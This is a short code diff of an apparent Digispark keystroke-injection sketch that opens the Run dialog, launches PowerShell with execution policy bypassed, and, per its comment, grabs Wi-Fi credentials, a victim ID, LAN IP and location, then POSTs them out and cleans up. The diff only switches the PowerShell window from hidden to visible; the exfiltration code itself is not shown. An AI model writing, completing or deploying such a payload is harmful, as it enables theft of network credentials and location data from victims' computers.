@@ -14,8 +14,8 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(600);
 
-  // Launch PowerShell (hidden)
-  DigiKeyboard.println("powershell -w hidden -NoLogo -NoProfile -ExecutionPolicy Bypass");
+  // Launch PowerShell (visible)
+  DigiKeyboard.println("powershell -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass");
   DigiKeyboard.delay(1800);
 
   // Wi‑Fi grab + victim ID + LAN IP + location + CSV + POST + cleanup + exit
